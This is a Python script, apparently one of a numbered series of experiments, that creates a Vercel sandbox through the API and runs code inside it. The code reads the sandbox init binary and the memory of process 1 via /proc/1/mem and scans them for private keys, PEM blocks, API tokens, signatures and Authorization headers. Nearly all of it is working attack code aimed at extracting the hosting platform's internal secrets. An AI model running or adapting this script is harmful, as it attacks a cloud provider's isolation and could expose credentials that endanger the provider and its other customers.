# 实验J49: PEM 上下文读取 + 全内存密钥扫描 + 匿名段修正
# 目标: 定位 BEGIN 块是否为私钥; 完整内存敏感信息
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj49"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, subprocess

print("===== [1] 二进制内 PEM 块 =====", flush=True)
b = open("/run/vercel/share/sandbox-init", "rb").read()
for m in re.finditer(rb"-----BEGIN [A-Z ]{5,60}-----", b):
    s, e = max(0, m.start()-40), min(len(b), m.end()+800)
    print("@%d: %r" % (m.start(), b[s:e][:900]), flush=True)
    print("---", flush=True)

print("===== [2] 内存 BEGIN 上下文 (0xe30000 区域) =====", flush=True)
fd = os.open("/proc/1/mem", os.O_RDONLY)
os.lseek(fd, 0xe30000 - 0x1000, os.SEEK_SET)
data = os.read(fd, 0x8000)  # 32KB
os.close(fd)
for m in re.finditer(rb"BEGIN", data):
    s = max(0, m.start()-100)
    print("ctx: %r" % data[s:m.start()+400], flush=True)
    print("===", flush=True)

print("===== [3] 全内存 PEM/密钥模式扫描 =====", flush=True)
fd = os.open("/proc/1/mem", os.O_RDONLY)
maps = open("/proc/1/maps").read()
found = []
for line in maps.splitlines():
    p = line.split()
    if len(p) < 2 or "r" not in p[1]:
        continue
    addr = p[0].split("-")
    start, end = int(addr[0], 16), int(addr[1], 16)
    if end - start > 8 * 1024 * 1024:
        continue
    try:
        os.lseek(fd, start, os.SEEK_SET)
        chunk = os.read(fd, min(end - start, 2 * 1024 * 1024))
    except Exception:
        continue
    for pat in [rb"-----BEGIN", rb"PRIVATE KEY", rb"ed25519", rb"secret", rb"vcp_",
                rb"signature", rb"x-sign", rb"timestamp", rb"Authorization"]:
        for m in re.finditer(pat, chunk):
            ctx = chunk[max(0,m.start()-60):m.start()+200]
            if all(32 <= c < 127 or c in (10,13,9) for c in ctx):
                found.append((hex(start+m.start()), pat, ctx))
os.close(fd)
print("found:", len(found), flush=True)
seen = set()
for a, pat, ctx in found:
    key = (pat, ctx[:80])
    if key in seen:
        continue
    seen.add(key)
    print("%s %r: %r" % (a, pat, ctx.decode('latin1', errors='replace')), flush=True)
    if len(seen) > 40:
        break

print("===== [4] 匿名 rw 段完整扫描 (堆) =====", flush=True)
fd = os.open("/proc/1/mem", os.O_RDONLY)
maps = open("/proc/1/maps").read()
total_scanned = 0
sigs = []
for line in maps.splitlines():
    p = line.split()
    if len(p) < 5 or "rw" not in p[1]:
        continue
    # 匿名段 (5 列)
    if len(p) == 5 and p[4] == "0":
        addr = p[0].split("-")
        start, end = int(addr[0], 16), int(addr[1], 16)
        if end - start > 32 * 1024 * 1024:
            continue
        try:
            os.lseek(fd, start, os.SEEK_SET)
            data = os.read(fd, min(end - start, 8 * 1024 * 1024))
            total_scanned += len(data)
        except Exception:
            continue
        # 搜 URL/路径/头/密钥
        for pat in [rb"http://", rb"https://", rb"/v[0-9]/", rb"/v[0-9]+/", rb"signature",
                    rb"timestamp", rb"PRIVATE", rb"BEGIN", rb"cell", rb"vercel",
                    rb"Host:", rb"GET ", rb"POST ", rb"token", rb"auth", rb"key"]:
            for m in re.finditer(pat, data):
                ctx = data[max(0,m.start()-80):m.start()+200]
                if all(32 <= c < 127 or c in (10,13,9) for c in ctx) and len(ctx) > 30:
                    sigs.append((hex(start+m.start()), pat, ctx.decode('latin1', errors='replace')))
os.close(fd)
print("scanned %d bytes, sigs: %d" % (total_scanned, len(sigs)), flush=True)
seen = set()
for a, pat, ctx in sigs:
    key = (pat, ctx[:100])
    if key in seen:
        continue
    seen.add(key)
    print("%s %r: %r" % (a, pat, ctx), flush=True)
    if len(seen) > 50:
        break
'''
run_cmd(sid, SCAN, "pem-mem-scan", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
